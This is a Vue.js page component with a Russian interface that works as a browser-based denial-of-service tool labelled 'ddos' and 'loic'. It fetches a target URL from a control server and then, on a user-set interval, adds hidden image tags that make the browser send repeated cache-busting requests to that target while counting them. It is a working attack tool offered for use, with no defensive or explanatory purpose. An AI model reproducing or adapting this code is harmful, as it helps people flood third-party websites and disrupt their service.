<template>
  <div id="home">
    <div id="ddos">
      <div id="meta">
        <div class="point">
          <p>Цель: <a :href="point">{{ point }}</a></p>
        </div>
        <div class="counter">
          <p>Запросы: {{ counter }}</p>
        </div>
      </div>
      <div id="loic">
        <div class="mode">
          <div class="interval">
            <label>Интервал (милисекунды): <input type="number" v-model.number="interval"></label>
          </div>
          <div class="requestsPerPass">
            <label>Запросов за проход: <input type="number" v-model.number="requestsPerPass"></label>
          </div>
          <button v-if='!started' v-on:click="start()">Старт</button>
          <button v-else v-on:click="stop()">Стоп</button>
        </div>
        <img class="hidden" v-for='addr in addrs' :src="point + '?PVD_RULEZZZ=' + addr + '&weAre=https://pvd.thirdwave.tk/'" :alt="addr" :title="addr">
      </div>
    </div>
    <Chat></Chat>
  </div>
</template>

<script>
  import Chat from '../components/Chat.vue'
  import $ from 'jquery'
  export default {
    name: 'Home',
    data () {
      return {
        point: "",
        counter: Number(),
        started: false,
        interval: 500,
        addrs: [],
        requestsPerPass: 1
      }
    },
    components: { Chat },
    methods: {
      fetchPoint () {
        var that = this
        var vm = that.$root
        $.ajax({
          url: vm.config.api,
          data: {
            method: 'point'
          },
          success (data) {
            if (data.success) {
              that.point = data.success
            }
            else {
              console.error(data.error)
            }
          }
        })
      },
      newRandom () {
        let addrs = []
        for (let i=0; i < this.requestsPerPass; i++) {
          addrs.push(random())
        }
        this.addrs = this.addrs.concat(addrs)
      },
      start () {
        var that = this
        this.started = true
        window.attack = setInterval(() => {
          that.newRandom()
          that.counter += that.requestsPerPass
        }, that.interval)
      },
      stop () {
        this.started = false
        clearInterval(window.attack)
      },
      loadPage () {
        this.fetchPoint()
      }
    },
    created () {
      this.loadPage()
    }
  }
</script>
